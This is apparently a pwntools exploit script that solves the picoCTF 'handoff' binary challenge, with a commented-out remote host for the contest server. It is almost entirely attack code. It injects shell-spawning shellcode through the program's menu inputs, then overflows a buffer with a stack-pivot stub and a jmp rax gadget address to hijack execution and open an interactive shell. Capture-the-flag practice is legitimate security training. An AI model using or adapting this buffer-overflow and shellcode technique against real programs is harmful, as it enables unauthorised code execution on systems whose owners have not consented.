#!/usr/bin/python3

from pwn import * 

context.arch = 'amd64'
#context.log_level = "debug"


#p = gdb.debug("./handoff",gdbscript='''b * vuln+447
#c''')
p = process("./handoff")
#p = remote("shape-facility.picoctf.net", 49696) #shape-facility.picoctf.net 62740

elf = context.binary = ELF("./handoff")

jmp_rax =p64(0x000000000040116c)
#shell = asm(shellcraft.cat("flag.txt")) # to just simply cat flag.txt 
shell = asm(shellcraft.sh())   # to gain shell
payload1 = asm("nop;nop;sub rsp,672;jmp rsp;") #asm("nop;add rax,0x8;jmp rax;")+asm("nop;nop;sub rsp,672;jmp rsp;")
print(payload1)
payload = payload1.ljust(21,b"\x90")
payload += jmp_rax
print(p.recvuntil(b"3. Exit mission control\n").decode())
p.send(b"1")
#p.recvuntil(b"What's the new recipient's name:")
p.sendline(b"aaaaaaaaaaaaaaaa")
print(p.recvuntil(b"3. Exit mission control\n").decode())
p.send(b"1")
#p.recvline()
p.sendline(b"aaaaaaaaaaaa")
print(p.recvuntil(b"3. Exit mission control\n").decode())
p.sendline(b"2")
p.send(b"1")
p.sendline(b"\x90"*16+((shell)))
print(shell)
print(p.recv().decode())
p.send(b"3")
p.sendline(payload)
p.interactive()
    
